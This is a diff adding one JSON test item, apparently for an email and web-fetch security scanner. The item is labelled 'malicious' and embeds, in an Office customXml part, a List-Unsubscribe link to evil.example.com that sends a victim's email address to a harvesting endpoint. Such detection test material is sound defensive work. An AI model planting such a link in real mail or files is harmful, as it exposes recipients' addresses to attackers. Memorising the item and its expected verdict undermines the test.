@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::35::binary-variations::6",
+  "base_sample_id": "exp::email-webfetch::35",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1063348602,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"customXml/item1.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">List-Unsubscribe: <http://evil.example.com/harvest?email=victim@target.example.com>\\n</field></root>\"\n  }\n}",
+  "content_hash": "d820e1a469797a26625cc8186589fde298639c766442cf8d34a9732883ec40b6",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
